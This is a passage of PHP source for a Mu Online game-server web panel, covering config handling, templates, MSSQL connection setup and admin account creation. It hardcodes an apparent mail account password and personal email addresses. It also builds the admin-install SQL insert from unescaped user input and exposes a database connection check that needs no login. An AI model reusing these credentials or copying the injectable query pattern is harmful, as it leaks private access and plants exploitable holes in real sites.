    $pass = SHA256_hash($salt . $str . '`>,');
    $pass = substr($pass, 0, $len) . $salt . substr($pass, $len);

    return $pass;
}

//Since 2.0.3 crossplatform path generator
function cn_path_construct()
{
    $args = array();
    $arg_list = func_get_args();

    foreach ($arg_list as $varg) {
        if ($varg !== '') {
            $args[] = $varg;
        }
    }

    return implode(DIRECTORY_SEPARATOR, $args) . DIRECTORY_SEPARATOR;
}


// Since 2.0: Get option from #CFG or [%site][<opt_name>]
// Usage: #level1/level2/.../levelN or 'option_name' from %site
function getoption($opt_name = '', $var_name = '')
{
    $cfg = mcache_get('config');

    if ($opt_name === '') {
        return $cfg;
    }
    if ($opt_name[0] == '#') {
        $cfn = spsep(substr($opt_name, 1), '/');
        foreach ($cfn as $id) {
            if (isset($cfg[$id])) {
                $cfg = $cfg[$id];
            } else {
                $cfg = array();
                break;
            }
        }

        return $cfg;
    } else if ($opt_name[0] == '@') {
        if (!empty($var_name)) {

            $opt_name_ = substr($opt_name, 1);

            return isset($cfg[$opt_name_][$var_name]) ? $cfg[$opt_name_][$var_name] : FALSE;
        } else {
            //exit();
            $opt_name_arr = spsep(substr($opt_name, 1), '/');
            foreach ($opt_name_arr as $id) {
                if (isset($cfg[$id])) {
                    $cfg = $cfg[$id];
                } else {
                    $cfg = array();
                    break;
                }
            }

            return $cfg;
        }

    } else {

        return isset($cfg['%site'][$opt_name]) ? $cfg['%site'][$opt_name] : FALSE;
        //else
        //return isset($cfg['#'.$var_name_][$opt_name]) ? $cfg['#'.$var_name_][$opt_name] : FALSE;

    }
}


// Since 2.0: Save option to config
// Usage: #level1/level2/.../levelN or 'option_name' from %site
function setoption($opt_name, $var)// $var_name ='')
{
    $cfg = mcache_get('config');

    if ($opt_name[0] == '#') {
        $c_names = spsep(substr($opt_name, 1), '/');
        $cfg = setoption_rc($c_names, $var, $cfg);
    } /*
    else if ($opt_name[0] == '@'){
		$set_n = substr($opt_name, 1);
		//if(!empty($var_name)){
			//exit();
			//$cfg[$set_n][$opt_name] = $var;
			$cfg[$set_n][$opt_name] = $var;
			//}
		//else
			//$cfg[$set_n][$var_name] = $var;
	}*/
    else {
        $cfg['%site'][$opt_name] = $var;
    }

    cn_config_save($cfg);
}


// Since 2.0: @Helper recursive function
function setoption_rc($names, $var, $cfg)
{
    $the_name = array_shift($names);
//echo "the name => $thename <br>";echo "the name => $var <br>";echo "the name => $cfg <br>";
    if (count($names) == 0) {
        $cfg[$the_name] = $var;
    } else {
        if (!isset($cfg[$the_name])) {
            $cfg[$the_name] = '';
        }
        $cfg[$the_name] = setoption_rc($names, $var, $cfg[$the_name]);
    }

    return $cfg;
}


// Since 1.5.1: Simply read template file
function read_tpl($tpl = 'index')
{
    // get from cache
    $cached = mcache_get("tpl:$tpl");
    if ($cached) {
        return $cached;
    }

    // Get asset path
    if (preg_match('/\.(css|js)/i', $tpl)) {
        $fine = '';
    } else {
        $fine = '.tpl';
    }

    // Get plugin path
    if ($tpl[0] == '/') {
        $open = cn_path_construct(SERVDIR, 'cdata', 'plugins') . substr($tpl, 1) . $fine;
    } else {
        $open = SKIN . DIRECTORY_SEPARATOR . ($tpl ? $tpl : 'default') . $fine;
    }

    // Try open
    $not_open = false;
    $r = fopen($open, 'r') or $not_open = true;
    if ($not_open) {
        return false;
    }

    ob_start();
    fpassthru($r);
    $ob = ob_get_clean();
    fclose($r);

    // caching file
    mcache_set("tpl:$tpl", $ob);
    return $ob;
}


// Since 2.0: Execute PHP-template
// 1st argument - template name, other - variables ==> mo file
function exec_tpl()
{
    $args = func_get_args();
    $tpl = preg_replace('/[^a-z0-9_\/]/i', '', array_shift($args));

    $open = SKIN . '/' . ($tpl ? $tpl : 'default') . '.php';

    foreach ($args as $arg) {
        if (is_array($arg)) {
            foreach ($arg as $k0 => $v) {
                $k = "__$k0";
                $$k = $v;
            }
        } else {
            list($k, $v) = explode('=', $arg, 2);

            // <-- make local variable
            $k = "__$k";
            $$k = $v;
        }
    }

    if (file_exists($open)) {
        ob_start();
        include $open;
        $echo = ob_get_clean();
        return $echo;
    }

    return '';
}

// Since 2.0: @bootstrap
function cn_load_skin()
{
    $config_skin = preg_replace('~[^a-z]~i', '', getoption('skin'));
    //$config_skin = preg_replace('~[^a-z]~i','', 'default');
    if (file_exists($skin_file = SERVDIR . "/skins/$config_skin.skin.php")) {
        include($skin_file);
    } else {
        die("Can't load skin $config_skin");
    }
}

// Since 2.0: @bootstrap Make & load configuration file ==>
function cn_config_load()
{
    global $_CN_access;

    $conf_dir = cn_path_construct(ROOT, 'gifnoc');
    if (!is_dir($conf_dir) || !is_writable($conf_dir)) {
        die('Permissions and CHMOD for gifnoc');
    }
    $conf_path = cn_path_construct(ROOT, 'gifnoc') . 'gifnoc.php';
    $cfg = cn_touch_get($conf_path); //doc or tao file

    if (!$cfg) {
        if (defined('XXXXXXXX_NEWS')) {
            echo 'Sorry, but news not available by technical reason.';
            die();
        } else {
            $cfg = cn_touch_get($conf_path, true);
        }
    }

    date_default_timezone_set("UTC"); //HKEY_LOCAL_MACHINE\\SYSTEM\CurrentControlSet\Control\TimeZoneInformation
    $shell = new COM("WScript.Shell") or die("Requires Windows Scripting Host");
    $time_bias = -($shell->RegRead("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\TimeZoneInformation\\ActiveTimeBias")) / 60;

    // make site section
    $cfg['%site'] = isset($cfg['%site']) ? $cfg['%site'] : array();

    $default_conf = array(
        'skin' => 'default',
        'frontend_encoding' => 'UTF-8',
        'useutf8' => 1,
        'utf8html' => 1,
//        'news_title_max_long' => 100,

        'date_adjust' => $time_bias,
        'num_center_pagination' => 3,
        'allow_registration' => 1,
        'registration_level' => 4,
        'config_time_logout' => 900,
        'config_time_logout_web' => 300,
        'config_login_ban' => '5:15',
        'ban_attempts' => 3,
        'hd_user_e' => 'Ym95bG92ZS5uZ29jaXRAZ21haWwuY29t',
        'config_auth_email' => 'ngoctbhy@gmail.com',
        'config_auth_pass' => '4111601501720',

        'show_comments_with_full' => 1,
        'timestamp_active' => 'd M Y',
        'use_captcha' => 1,
        'reverse_comments' => 0,
        'flood_time' => 15,
        'comments_std_show' => 1,
        'comment_max_long' => 1500,
        'comments_per_page' => 5,
        'only_registered_comment' => 0,
        'allow_url_instead_mail' => 1,
        'comments_popup' => 0,
        'comments_popup_string' => 'HEIGHT=400,WIDTH=650,resizable=yes,scrollbars=yes',
        'show_full_with_comments' => 1,
        'timestamp_comment' => 'd M Y h:i a',
        'mon_list' => 'January,February,March,April,May,June,July,August,September,October,November,December',
        'week_list' => 'Sunday,Monday,Tuesday,Wednesday,Thursday,Friday,Saturday',

        //SEO
        'description' => "Mu Online Season 6, Mu Online Season 6.3",
        'keywords' => "Mu Online,MuOnline,Mu Season 6.3,Mu Season 6,MuSeason6,Mu Season 5,MuSeason5,MuVietNam,Mu Viet Nam,Mu Mien Phi,Mu Top Viet Nam,Game Online,Online Game,Game Hay",

        // EDITCONFIG
        'Use_WebShop' => 1,
        'Use_NapVpoint' => 1,
        'Use_ChuyenVpoint' => 1,
        'Use_TienTe' => 1,
        'Use_DoiGioiTinh' => 1,
        'Use_ResetVIP' => 1,
        'Use_UyThacOffline' => 1,
        'Use_UyThacResetVIP' => 1,
        'use_gioihanrs' => 1,

        'domain_pri' => "192.168.X.X",
        'home_url' => "http://192.168.X.X/ABC",

        "conf['path']" => "Firewall",
        'use_antiddos' => 1,
        "conf['maxaccess']" => 3,
        "conf['interval']" => 1,
        "conf['requests']" => 10,
        "conf['blocktime']" => 10,

        'Use_WebShop' => 1,
        'Use_TienTe' => 1,
        'Use_NapThe' => 1,
        'Use_Event' => 1,
        'Use_XepHang' => 1,
        'Use_ShopTienZen' => 1,
        'Use_DoiGioiTinh' => 1,
        'Use_ResetVIP' => 1,
        'Use_UyThacOffline' => 1,
        'Use_UyThacOnline' => 1,
        'Use_ChangeName' => 1,
        'Use_Char2AccOther' => 1,
        'Use_CardGATE' => 1,
        'Use_CardVTCOnline' => 1,
        'Use_CardViettel' => 1,
        'Use_CardMobi' => 1,
        'Use_CardVina' => 1,
        'Use_Gcoin2VipMoney' => 1,
        'Use_Gcoin2WCoin' => 1,
        'Use_Gcoin2WCoinP' => 1,
        'Use_Gcoin2GoblinCoin' => 1,

        'notify_registration' => 1,
        'napthe_gate' => "0,1,0,1,1,1,0,1",
        'napthe_mobi' => "0,1,0,1,1,1,0,1",
        'napthe_viettel' => "1,1,0,1,1,1,0,1",
        'napthe_vina' => "0,1,0,1,1,1,0,1",
        'napthe_vtc' => "0,1,0,1,1,1,0,1",
        'napthe_list' => "1,1,1,1,1",
        'km_list' => "0,0,0,0,0|20",
        'vptogc' => 80,
        'changename_vpoint' => 50000,
        'changeClass_str' => '50000:15:100',
        'user_rs_uythac' => 1,
        'uythacon_price' => 10,
        'uythacoff_price' => 10,
        'user_delegate' => 2,
        'event_toprs_on' => 1,
        'hotrotanthu' => 1,
        'cap_relife_max' => 7,
        'cap_reset_max' => 7,
        'use_gioihanrs' => 1,

        // CHARACTER Question
        'question_answers' => 'Tên con vật yêu thích,Trò chơi bạn thích nhất,Tên con vật yêu thích,Trường cấp 1 của bạn tên gì,Người bạn yêu quý nhất,Nơi để lại kỉ niệm khó quên nhất',
        // Vpoint - level
        'configLevel' => '2000|3000|5000',
        //Relax
        'user_BauCua' => 1,
        'user_BaiCao' => 1,
        //configBuyZen
        'configBuyZen' => '5000|10000|15000|20000',
        //TransVpoint
        'configTransVpoint' => '5000',
        // Time write De
        'timeWriterLimit' => '17:45',
        'timeResultDe' => '8:00',
        'moneyMinDe' => '5000',
        'url_Result_De' => 'http://ketqua.net/',
        // config Account GameBank.vn
        'Merchant_ID' => '',
        'API_User' => '',
        'API_Password' => '',
        //DebugSql
        'debugSql' => 0

    );

    // Set default values
    foreach ($default_conf as $k => $v) {
        if (!isset($cfg['%site'][$k])) {
            $cfg['%site'][$k] = $v;
        }
    }

    // Set basic groups
    if (!isset($cfg['grp'])) {
        $cfg['grp'] = array();
    }

    // Make default groups
    $cgrp = file(cn_path_construct(SKIN, 'defaults') . 'groups.tpl');
    foreach ($cgrp as $G) {
        $G = trim($G);
        if ($G[0] === '#') {
            continue;
        }

        list($id, $name, $group, $access) = explode('|', $G);
        $id = intval($id);

        // Is empty row
        if (empty($cfg['grp'][$id])) {
            $cfg['grp'][$id] = array(
                'N' => $name,
                'G' => $group,
                '#' => TRUE,
                'A' => ($access === '*') ? $_CN_access['C'] . ',' . $_CN_access['N'] . ',' . $_CN_access['M'] : $access,
            );
        }
    }

    // Admin has ALL privilegies
    $cfg['grp'][1]['A'] = $_CN_access['C'] . ',' . $_CN_access['N'] . ',' . $_CN_access['M'];

    $Items_Data = file(cn_path_construct(SKIN, 'defaults') . 'Items_Data.txt');
    // OptionImage|Group|ID|NAME|X|Y|SetItem1|SetItem2

    foreach ($Items_Data as $key => $line) {
        $line_ = trim($line);
        $lineComment = substr($line_, 0, 2);
        if (empty($line_) || $lineComment == '//') continue;

        list($optImg, $group, $id, $name, $x, $y, $set1, $set2) = explode('|', $line_, 8);
        $key = $group . "." . $id;
        // Is empty row

//        $optImgRender = cn_renderImageItemCode((string)$group, (string)$id, (string)$optImg);

        if (!isset($cfg['items_data'][$key])) {

            $cfg['items_data'][$key] = array(
                'Image' => $optImg,
                'G' => $group,
                'ID' => $id,
                'Name' => $name,
                'X' => $x,
                'Y' => $y,
                'SET1' => @$set1 ? $set1 : '',
                'SET2' => @$set2 ? $set2 : ''
            );
        }
    }

    // Set config
    mcache_set('config', $cfg);

    // SET PHAN QUYEN
    if (!getoption('#grp')) {
        setoption("#grp", $cfg['grp']);
    }
    if (!getoption('#items_data')) {
        setoption("#items_data", $cfg['items_data']);
    }

    // Make crypt-salt [after config sync]
    if (!getoption('#crypt_salt')) {
        $salt = SHA256_hash(mt_rand() . mt_rand() . mt_rand() . mt_rand() . mt_rand() . mt_rand() . mt_rand() . mt_rand());
        setoption("#crypt_salt", $salt);
    }

    // ---------------- S_custum by bqn -----
    // Detect self pathes
    $SN = dirname($_SERVER['SCRIPT_NAME']);
    $script_path = "http://" . $_SERVER['SERVER_NAME'] . (($SN != '/') ? '' : $SN);
//    $script_path = "http://" . $_SERVER['SERVER_NAME'];
    //check http_script_dir
    $path_http_script_dir = $script_path;
    if (getoption('http_script_dir') != $path_http_script_dir)
        setoption('http_script_dir', $path_http_script_dir);


    //check update_dir c://xampp/bqn/d
    $path_update_dir = cn_path_construct(ROOT, 'uploads');
    if (getoption('uploads_dir') != $path_update_dir)
        setoption('uploads_dir', $path_update_dir);

    //check uploads_ext http://localhost/bqn/d
    $path_uploads_ext = URL_PATH . '/uploads';
    if (getoption('uploads_ext') != $path_uploads_ext)
        setoption('uploads_ext', $path_uploads_ext);
    // ---------------- E_custum by bqn -----

    return true;
}

// Since 2.0: Decode "defaults/templates" to list
function cn_template_list()
{
    $config = file(cn_path_construct(SKIN, 'defaults') . 'character.tpl');

    foreach ($config as $line) {
        $line_ = trim($line);
        $lineComent = substr($line_, 0, 2);
        if (count($line_) === 0 || $line_ === '' || $lineComent == '//') {// || preg_match('/\s/', $line[0])){
            continue;
        }

        if ($line_[0] === '#') {
            continue;
        }
        if ($line_[0] == '*') {
            $_tpl_var = trim(substr($line_, 1));
            //if ($_tpl_var) $cfg[$template_vars][$_tpl_var] = ''; // lay ten *
            if ($_tpl_var) {
                if (!isset($templates[$_tpl_var])) $templates[$_tpl_var] = array();
                $template_vars_name = $_tpl_var;
            }
            continue;
        } else if ($line_[0] !== '@') {//preg_match('/\s/', $line[0]) && $line_[0] !== ''){
            list($name_, $value_get) = explode('=', $line_);
            $value_ = str_replace('_', ' ', $value_get);
            if (!isset($templates[$_tpl_var][$name_])) {
                $templates[$_tpl_var][$name_] = $value_;
            }
        } else if ($line_[0] == '@') {
            continue;
        }
    }

    setoption('#temp_basic', $templates);

    return isset($templates) ? $templates : array();
}

// Since 2.0: Get template (if not exists, create from defaults)
function cn_get_template_byarr($template_name = '')//$subtemplate='')
{
    $templates = getoption('#temp_basic');

    //if(!empty($template_name) && $template_name){
    $template_name = strtolower($template_name);

    // User template not exists in config... get from defaults
    if (isset($templates[$template_name])) {
        return $templates[$template_name];
    }

    $list = cn_template_list();


    if (isset($list[$template_name])) {
        return $list[$template_name];
    }

    return false;
}

function cn_bc_menu($name, $url, $opt)
{
    $bc = mcache_get('.menu');
    $bc[$opt] = array('name' => $name, 'url' => $url);
    mcache_set('.menu', $bc);
}

function cn_sort_menu($opt)
{
    $bc = mcache_get('.menu');
    $result = '<select class="sel-p" onchange="document.location.href=this.value">';
    foreach ($bc as $key => $item) {
        $check = strpos($item['url'], $opt);
        $result .= '<option value="' . $item['url'] . '"';
        if ($check !== false) $result .= 'selected';
        $result .= '>' . cn_htmlspecialchars($item['name']) . '</option>';
    }

    $result .= "</select>";

    echo $result;
}

// Since 2.0: Read file (or create file)
function cn_read_file($target)
{
    $fn = cn_touch($target, TRUE);
    $fc = file($fn);
    unset($fc[0]);

    if (!$fc) {
        $data = array();
    } else {
        foreach ($fc as $id => $val) {
            $val = trim($val);

            $ctime = substr(md5($val), 3, 11);
            list($code32, $name, $price, $image) = explode("|", $val);

            if (!cn_check_code32(trim($code32))) continue;

            $data[$ctime] = array(
                'code32' => trim($code32),
                'name' => $name,
                'price' => $price,
                'image_mh' => $image,
            );
        }
    }

    return @$data ? $data : array();
}

/**
 * @param $code32
 * @return bool
 */
function cn_check_code32($code32)
{
    if ($code32 == 'FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF' || $code32 == 'ffffffffffffffffffffffffffffffff' || $code32 == '' || strlen($code32) != 32) {
        return false;
    }

    $items_data = getoption('#items_data');
    $id = hexdec(substr($code32, 0, 2));
    $group = hexdec(substr($code32, 18, 2)) / 16;

    if (isset($items_data[$group . '.' . $id])) {
        return true;
    }

    return false;
}


// Since 2.0: Save whole config
function cn_config_save($cfg = null)
{
    if ($cfg === null) {
        $cfg = mcache_get('config');
    }

    $fn = cn_path_construct(ROOT, 'gifnoc') . 'gifnoc.php';
    $dest = $fn . '-' . mt_rand() . '.bak';

    //save all config
    $fx = fopen($dest, 'w+');
    fwrite($fx, "<?php die(); ?>\n" . base64_encode(serialize($cfg)));

    fclose($fx);
    //unlink($fn); // xoa file hien tai
    rename($dest, $fn); //bat len .....

    mcache_set('config', $cfg);
    return $cfg;
}


// Since 1.5.0: Force relocation
function cn_relocation($url)
{
    if (!$url) $url = $_SERVER['PHP_SELF'];
    header("Location: $url");
    echo '<html><head><title>Redirect...</title><meta http-equiv="refresh" content="0;url=' . cn_htmlspecialchars($url) . '"></head><body>Please wait... Redirecting to "' . cn_htmlspecialchars($url) . '...<br/><br/></body></html>';
    die();
}

// Since 2.0: @bootstrap Select DB mechanism
function cn_db_init()
{
    include ROOT . '/core/db/flat_web.php';
}

// bqn relocation => $db + server
function cn_relocation_db()
{
    global $db_new, $config_adminemail, $config_admin;
    $type_connect = getoption('type_connect');
    $localhost = getoption('localhost');
    $databaseuser = getoption('databaseuser');
    $databsepassword = getoption('databsepassword');
    $d_base = getoption('d_base');

    if (!$type_connect || !$localhost || !$databaseuser || !$databsepassword || !$d_base) {
        session_unset();
        session_destroy();
        cn_db_installed();
    }

    $config_admin = "BUI NGOC";
    $config_adminemail = "ngoctbhy@gmail.com";

    include_once(SERVDIR . '/adodb/adodb.inc.php');

    if ($type_connect == 'odbc') {
        $db_new = ADONewConnection('odbc');
        $database_ = "Driver={SQL Server};Server={$localhost};Database={$d_base}";
        $connect_mssql = $db_new->Connect($database_, $databaseuser, $databsepassword);
        $db_new->SetFetchMode(ADODB_ASSOC_CASE);
        if (!$connect_mssql) die('Kết nối với SQL Server lỗi!! Hãy kiểm tra lại ODBC tồn tại hoặc User - Pass không đúng.');
    } else if ($type_connect == 'mssql') {
        if (extension_loaded('mssql')) echo('');
        else Die('Lỗi! Không thể load thư viện php_mssql.dll. Hãy cho phép sử dụng php_mssql.dll trong php.ini');
        $db_new = &ADONewConnection('mssql');
        $connect_mssql = $db_new->Connect($localhost, $databaseuser, $databsepassword, $d_base);
        $db_new->SetFetchMode(ADODB_ASSOC_CASE);
        if (!$connect_mssql) die('Lỗi! Không thể kết nối SQL Server!');
    } else {
        die ('Lỗi! Không thể kết nối SQL Server!');
    }
}

function cn_db_installed()
{
    if (defined('AREA') && AREA == 'ADMIN') {
        include SERVDIR . '/skins/default.skin.php';

        // Submit
        if (request_type('POST')) {

            list($type_connect, $nameLocal, $nameSql, $pwdDb, $nameSaveDb, $server_type, $actionSave) = GET('type_connect, nameLocal, nameSql, pwdDb, nameSaveDb, server_type, actionSave', 'GPG');

            if (!$type_connect) {
                cn_throw_message('Enter username', 'e');
            }
            if (!$nameLocal) {
                cn_throw_message('Enter Localhost', 'e');
            }
            if (!$nameSql) {
                cn_throw_message('Enter username login Database', 'e');
            }
            if (!$pwdDb) {
                cn_throw_message('Enter password', 'e');
            }
            if (!$nameSaveDb) {
                cn_throw_message('Enter name database', 'e');
            }
            if (!$actionSave) {
                cn_throw_message('Kết nối đến Server thất bại.', 'e');
            }

            // All OK
            if ($actionSave && cn_get_message('e', 'c') == 0) {

                $opt_result = getoption('#%site');

                $opt_result['type_connect'] = $type_connect;
                $opt_result['localhost'] = $nameLocal;
                $opt_result['databaseuser'] = $nameSql;
                $opt_result['databsepassword'] = $pwdDb;
                $opt_result['d_base'] = $nameSaveDb;

                $opt_result['server_type'] = $server_type;

                setoption('#%site', $opt_result);

                cn_throw_message('Saved successfully');
                cn_relocation(getoption('http_script_dir') . '/admin.php');
            }
        }
        echoheader('-@../skins/default.css', 'Install Database');
        echo exec_tpl('installdb');
        echofooter();
    }
}

function cn_check_conncet()
{
    error_reporting(0);
    if (request_type('POST')) {

        list($type_connect, $localhost, $databaseuser, $databsepassword, $d_base) = GET('type_connect, nameLocal, nameSql, pwdDb, nameSaveDb', 'GPG');

        if ($localhost && $databaseuser && $databsepassword && $d_base) {

            $resultSms = '1|Kết nối thành công với SQL Server!';

            include_once('../adodb/adodb.inc.php');
            if ($type_connect == 'odbc') {
                $db_new = ADONewConnection('odbc');
                $database_ = "Driver={SQL Server};Server={$localhost};Database={$d_base}";
                $connect_mssql = $db_new->Connect($database_, $databaseuser, $databsepassword);
                if (!$connect_mssql) {
                    die('0|Kết nối với SQL Server lỗi!! Hãy kiểm tra lại ODBC hoặc User - Pass không đúng.');
                }
            } else if ($type_connect == 'mssql') { // config sau
                if (extension_loaded('mssql')) echo('');
                else {
                    die('0|Lỗi! Không thể load thư viện php_mssql.dll. Hãy cho phép sử dụng php_mssql.dll trong php.ini');
                }
                $db_new = &ADONewConnection('mssql');
                $connect_mssql = $db_new->Connect($localhost, $databaseuser, $databsepassword, $d_base);
                if (!$connect_mssql) die('0|Lỗi! Không thể kết nối SQL Server');
            } else {
                die ('Chưa xác định dạng kết nối!');
            }

            die($resultSms);
        }
    }
}

// Since 2.0: File users.php not exists, call installation script
function cn_require_install()
{
    global $_SESS;

    if (defined('AREA') && AREA == 'ADMIN') {
        $_SESSION = array();
        include SERVDIR . '/skins/default.skin.php';

        if (request_type('POST')) {

            list($username, $email, $password1, $password2) = GET('username, email, password1, password2', 'GPG');

            if (!$username) {
                cn_throw_message('Enter username', 'e');
            } elseif (strlen($username) < 2) {
                cn_throw_message('Too short username (must be 2 char min)', 'e');
            }

            if (!$password1) {
                cn_throw_message('Enter password', 'e');
            } elseif (strlen($password1) < 4) {
                cn_throw_message('Too short password (must be 4 char min)', 'e');
            }

            if (!check_email($email)) {
                cn_throw_message('Invalid email', 'e');
            }

            if ($password1 !== $password2) {
                cn_throw_message("Confirm don't match", 'e');
            }

//            // All OK
            if (cn_get_message('e', 'c') == 0) {

                do_insert_character('[Account_Info]', 'AdLevel=' . ACL_LEVEL_ADMIN, "UserAcc='" . $username . "'", "Pwd='" . SHA256_hash($password1) . "'", "Email='" . $email . "'", "Lastdate=" . ctime(), 'Time_At=GETDATE()', 'Ban=0', 'NumLogin=1');

                $_SESSION['mu_Account'] = $username;

//                // Detect self pathes
//                $SN = dirname($_SERVER['SCRIPT_NAME']);
//                $script_path = "http://" . $_SERVER['SERVER_NAME'] . (($SN == '/') ? '' : $SN);
//
//                setoption('http_script_dir', $script_path);
//                setoption('uploads_dir', cn_path_construct(SERVDIR, 'uploads'));
//                setoption('uploads_ext', $script_path . '/uploads');
//                setoption('rw_layout', SERVDIR . DIRECTORY_SEPARATOR . 'example.php');
//
//                // Greets page
//                cn_relocation("http://cutephp.com/thanks.php?referer=" . urlencode(base64_encode('http://' . $_SERVER['SERVER_NAME'] . PHP_SELF)));
                cn_throw_message('Tạo thành công tài khoản Admin');
                cn_relocation(getoption('http_script_dir') . "/admin.php");
            }
        }


        echoheader('-@../skins/default.css', 'Create admin Account');
        echo exec_tpl('install');
        echofooter();
    }
}

// Since 2.0: Add message
function cn_throw_message($msg, $area = 'n')
{
    $es = mcache_get('msg:stor');

    if (!isset($es[$area])) $es[$area] = array();
    $es[$area][] = $msg;

    mcache_set('msg:stor', $es);
    return FALSE;
}


// Since 2.0.3
function cn_user_email_as_site($user_email, $username)
{
    if (preg_match('/^www\./i', $user_email)) {
        return '<a target="_blank" href="http://' . cn_htmlspecialchars($user_email) . '">' . $username . '</a>';
    } elseif (preg_match('/^(https?|ftps?):\/\//i', $user_email)) {
        return '<a target="_blank" href="' . cn_htmlspecialchars($user_email) . '">' . $username . '</a>';
    } else {
        return '<a href="mailto:' . cn_htmlspecialchars($user_email) . '">' . $username . '</a>';
    }
}

/**
 * Retrun Hmtl Uses Disk
 */
function cn_checkDisk()
{
    if (function_exists('disk_total_space') && function_exists('disk_free_space')) {
        $ds = disk_total_space("/");
        $fs = disk_free_space("/");

        $symbols = array('B', 'KiB', 'MiB', 'GiB', 'TiB', 'PiB', 'EiB', 'ZiB', 'YiB');
        $exp = intval(log($ds) / log(1024));
        $ds_t = sprintf('%.2f ' . $symbols[$exp], ($ds / pow(1024, floor($exp))));
        $free = intval((1 - $fs / $ds) * 100);
    } else {
        $free = 0;
        $ds_t = 0;
    }

    echo '<h2>Statistics</h2><div class="options">';
    if ($free) {
        echo '<div>Disk usage (' . $ds_t . ')</div><div class="a"><div class="b" style="width: ' . $free . '%">' . $free . '%</div></div><div style="clear: left;"></div>';
    }
    echo '</div>';
}

$name_function = '';
if (isset($_REQUEST['name_function'])) {
    $name_function = $_GET['name_function'];
}
if ($name_function == 'cn_check_conncet') {
    cn_check_conncet();
}
?>